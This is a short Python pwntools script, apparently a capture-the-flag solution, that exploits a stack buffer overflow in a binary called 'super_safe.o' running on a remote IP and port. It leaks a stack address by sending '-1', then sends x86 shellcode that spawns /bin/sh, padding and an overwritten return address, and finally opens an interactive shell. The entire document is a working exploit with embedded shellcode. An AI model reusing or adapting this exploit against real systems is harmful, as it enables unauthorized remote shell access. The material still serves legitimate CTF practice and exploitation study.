from pwn import *

#r = process('./super_safe.o')
r = remote('221.149.226.120', 31337)

x = r.recvuntil(b': \n')
r.sendline(b'-1')

stack = r.recvuntil(b'\n')[8:-1]
stack = stack.decode('utf-8')
stack = int(stack,16)
print(hex(stack))

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = shellcode + b'a'*(40-len(shellcode))
ex += b'a'*4 #int
ex += b'a'*4 #sfp
ex += p32(stack)

r.send(ex)

r.interactive()

